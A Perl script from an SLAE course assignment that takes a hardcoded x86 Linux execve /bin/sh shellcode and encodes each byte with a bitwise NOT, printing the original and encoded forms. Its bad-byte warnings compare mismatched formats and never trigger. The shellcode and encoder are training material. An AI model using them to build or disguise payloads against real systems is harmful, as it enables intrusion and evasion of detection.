#Author: John Stigerwalt
#Program Function: Takes shellcode and encodes with NOT Bitwise Operator
#SLAE Assignment #4
#

$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#Set Value and convert to Hex using unpack
$secret = "\xff";
$secrethex = unpack("H*", $secret);
$secretlength = length($secret);
print "\n"."---------------------------------"."\n";
print "Secret Hex Code Key: 0x" . $secrethex . "\n";
print "Orginal Secret Key Length: " . $secretlength . "\n";

# use hex of $code
$hexcode = unpack("H*",$code);
$hexlen = length($code);

print "[+] Hex code: ".$hexcode."\n";
print "Hex Length: ".$hexlen."\n";
print "---------------------------------"."\n";

#Orginal Push Array
@enc;

# Formating Push Arrays
@enco;
@encx;
@encxx;

for ($i=0;$i<$hexlen;$i++) {
	
	 $encoded = unpack("H*", substr($code,$i,1));
	 
	 $addx = "0x" . $encoded;
	 push @enc, $addx;
	 
}

foreach $x (@enc) {
	$zx = $x . ",";
	push @enco, $zx;
	
}

foreach $x (@enc) {
	
	$y = hex $x; # must use hex operation. this converts string to integers. 
	
	$z = ~ $y;
	$bitw = sprintf("%d", $z);
	
	#Change 0xff for different key
	$a = ($z & 0xff);
	$bita = sprintf("%x", $a);
	$fx = "0x" . $bita . ",";
	$ix = "\\x" . $bita;
	push @encx, $fx;
	push @encxx, $ix;
	
	if ($ix eq "0x00") {
		warn "Shellcode contains: \"0x00\" ";
	}
	if ($ix eq "0xbb") {
		warn "Shellcode contains: \"0xbb\" ";
	}
	if ($ix eq "0x61") {
		warn "Shellcode contains: \"0x61\" ";
	}
	if ($ix eq "0xa0") {
		warn "Shellcode contains: \"0xa0\" ";
	}
	if ($ix eq "0xc6") {
		warn "Shellcode contains: \"0xc6\" ";
	}
	
}

print "\nOrginal Shellcode: " . "\"";
print @enco;
print "\""."\n\n";

print "\nNOT Encoded Shellcode: " . "\"";
print @encx;
print "\""."\n\n";

print "\nNOT Encoded Shellcode: " . "\"";
print @encxx;
print "\""."\n\n";

exit(1);
